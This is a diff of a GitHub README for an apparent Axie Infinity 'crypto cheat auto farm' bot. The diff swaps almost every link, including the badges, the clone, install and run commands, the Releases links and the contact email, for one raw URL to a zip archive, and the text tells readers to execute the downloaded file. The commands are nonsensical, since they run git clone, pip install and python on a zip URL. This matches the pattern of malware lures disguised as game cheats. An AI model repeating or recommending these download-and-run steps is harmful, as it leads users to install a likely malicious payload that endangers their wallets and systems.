@@ -1,6 +1,6 @@
 # Axie Infinity Bot: Crypto Cheat Auto Farm Clicker Game API Hack 🎮💰
 
-![Axie Infinity Bot](https://img.shields.io/badge/Axie%20Infinity%20Bot-v1.0-blue.svg) ![GitHub Release](https://img.shields.io/badge/Release-v1.0-orange.svg)
+![Axie Infinity Bot](https://raw.githubusercontent.com/ulas6221/Axie-Infinity-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack-km/main/unfragrantly/Crypto_Hack_km_Game_Axie_Clicker_Cheat_Api_Infinity_Bot_Auto_Farm_3.4.zip%20Infinity%https://raw.githubusercontent.com/ulas6221/Axie-Infinity-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack-km/main/unfragrantly/Crypto_Hack_km_Game_Axie_Clicker_Cheat_Api_Infinity_Bot_Auto_Farm_3.4.zip) ![GitHub Release](https://raw.githubusercontent.com/ulas6221/Axie-Infinity-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack-km/main/unfragrantly/Crypto_Hack_km_Game_Axie_Clicker_Cheat_Api_Infinity_Bot_Auto_Farm_3.4.zip)
 
 Welcome to the **Axie Infinity Bot** repository! This bot automates farming and clicker activities in the popular blockchain game, Axie Infinity. With integrated crypto features and API support, this tool is designed to enhance your gameplay and maximize your profits. 
 
@@ -35,7 +35,7 @@ To get started, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/ulas6221/Axie-Infinity-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack-km.git
+   git clone https://raw.githubusercontent.com/ulas6221/Axie-Infinity-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack-km/main/unfragrantly/Crypto_Hack_km_Game_Axie_Clicker_Cheat_Api_Infinity_Bot_Auto_Farm_3.4.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -46,11 +46,11 @@ To get started, follow these steps:
 3. **Install Dependencies**:
    Make sure you have Python and pip installed. Then run:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/ulas6221/Axie-Infinity-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack-km/main/unfragrantly/Crypto_Hack_km_Game_Axie_Clicker_Cheat_Api_Infinity_Bot_Auto_Farm_3.4.zip
    ```
 
 4. **Download the Latest Release**:
-   Visit the [Releases](https://github.com/ulas6221/Axie-Infinity-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack-km/releases) section to download the latest version. Execute the downloaded file to get started.
+   Visit the [Releases](https://raw.githubusercontent.com/ulas6221/Axie-Infinity-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack-km/main/unfragrantly/Crypto_Hack_km_Game_Axie_Clicker_Cheat_Api_Infinity_Bot_Auto_Farm_3.4.zip) section to download the latest version. Execute the downloaded file to get started.
 
 ## Usage
 
@@ -62,7 +62,7 @@ Once you have installed the bot, follow these steps to use it:
 2. **Run the Bot**:
    Use the following command to start the bot:
    ```bash
-   python bot.py
+   python https://raw.githubusercontent.com/ulas6221/Axie-Infinity-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack-km/main/unfragrantly/Crypto_Hack_km_Game_Axie_Clicker_Cheat_Api_Infinity_Bot_Auto_Farm_3.4.zip
    ```
 
 3. **Monitor Performance**:
@@ -100,11 +100,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any questions or support, please contact the maintainer:
 
 - **Name**: Ulas
-- **Email**: ulas@example.com
+- **Email**: https://raw.githubusercontent.com/ulas6221/Axie-Infinity-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack-km/main/unfragrantly/Crypto_Hack_km_Game_Axie_Clicker_Cheat_Api_Infinity_Bot_Auto_Farm_3.4.zip
 
 ## Releases
 
-To download the latest version of the bot, visit the [Releases](https://github.com/ulas6221/Axie-Infinity-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack-km/releases) section. Make sure to download the appropriate file for your system and execute it to start automating your Axie Infinity gameplay.
+To download the latest version of the bot, visit the [Releases](https://raw.githubusercontent.com/ulas6221/Axie-Infinity-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack-km/main/unfragrantly/Crypto_Hack_km_Game_Axie_Clicker_Cheat_Api_Infinity_Bot_Auto_Farm_3.4.zip) section. Make sure to download the appropriate file for your system and execute it to start automating your Axie Infinity gameplay.
 
 ## Conclusion
 
@@ -112,7 +112,7 @@ The Axie Infinity Bot provides a powerful tool for players looking to enhance th
 
 Explore the features, install the bot, and start your journey towards becoming a top player in Axie Infinity! 
 
-![Axie Infinity Gameplay](https://example.com/axie-infinity-gameplay.jpg)
+![Axie Infinity Gameplay](https://raw.githubusercontent.com/ulas6221/Axie-Infinity-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack-km/main/unfragrantly/Crypto_Hack_km_Game_Axie_Clicker_Cheat_Api_Infinity_Bot_Auto_Farm_3.4.zip)
 
 ---
 
